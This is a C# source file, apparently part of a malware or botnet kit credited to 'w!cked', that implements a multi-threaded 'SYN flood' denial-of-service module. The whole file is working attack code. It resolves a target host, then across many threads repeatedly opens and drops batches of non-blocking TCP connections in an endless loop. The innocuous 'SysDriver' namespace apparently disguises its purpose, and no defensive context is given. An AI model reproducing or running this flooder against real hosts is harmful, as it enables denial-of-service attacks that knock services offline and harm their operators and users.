using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SysDriver
{
    /* Copyright © 2010 w!cked */

    internal class nSYNFlood
    {
        private static ThreadStart[] tFloodingJob;
        private static Thread[] tFloodingThread;
        public static string sFHost;
        private static IPEndPoint IPEo;
        public static ushort uPort;
        private static SYNRequest[] SYNClass;
        public static int iSSockets;
        public static int iThreads;

        public static void StartSYNFlood()
        {
            try
            {
                IPEo = new IPEndPoint(Dns.GetHostEntry(sFHost).AddressList[0], uPort);
            }
            catch
            {
                IPEo = new IPEndPoint(IPAddress.Parse(sFHost), uPort);
            }

            tFloodingThread = new Thread[iThreads];
            tFloodingJob = new ThreadStart[iThreads];
            SYNClass = new SYNRequest[iThreads];

            for (int i = 0; i < iThreads; i++)
            {
                SYNClass[i] = new SYNRequest(IPEo, iSSockets);
                tFloodingJob[i] = new ThreadStart(SYNClass[i].Send);
                tFloodingThread[i] = new Thread(tFloodingJob[i]);
                tFloodingThread[i].Start();
            }
        }

        public static void StopSYNFlood()
        {
            for (int i = 0; i < iThreads; i++)
            {
                try
                {
                    tFloodingThread[i].Abort();
                    tFloodingThread[i].Join();
                }
                catch { }
            }
        }

        private class SYNRequest
        {
            private IPEndPoint IPEo;
            private Socket[] pSocket;
            private int iSSockets;

            public SYNRequest(IPEndPoint tIPEo, int tSSockets)
            {
                this.IPEo = tIPEo;
                this.iSSockets = tSSockets;
            }

            private void OnConnect(IAsyncResult ar)
            {
            }

            public void Send()
            {
                int iNum;
            Label:
                try
                {
                    this.pSocket = new Socket[this.iSSockets];

                    for (iNum = 0; iNum < this.iSSockets; iNum++)
                    {
                        this.pSocket[iNum] = new Socket(this.IPEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                        this.pSocket[iNum].Blocking = false;
                        AsyncCallback aCallback = new AsyncCallback(this.OnConnect);
                        this.pSocket[iNum].BeginConnect(this.IPEo, aCallback, this.pSocket[iNum]);
                    }

                    Thread.Sleep(100);

                    for (iNum = 0; iNum < this.iSSockets; iNum++)
                    {
                        if (this.pSocket[iNum].Connected) { this.pSocket[iNum].Disconnect(false); }
                        this.pSocket[iNum].Close();
                        this.pSocket[iNum] = null;
                    }

                    this.pSocket = null;
                    goto Label;
                }
                catch
                {
                    for (iNum = 0; iNum < this.iSSockets; iNum++)
                    {
                        try
                        {
                            if (this.pSocket[iNum].Connected) { this.pSocket[iNum].Disconnect(false); }
                            this.pSocket[iNum].Close();
                            this.pSocket[iNum] = null;
                        }
                        catch { }
                    }

                    goto Label;
                }
            }
        }
    }
}

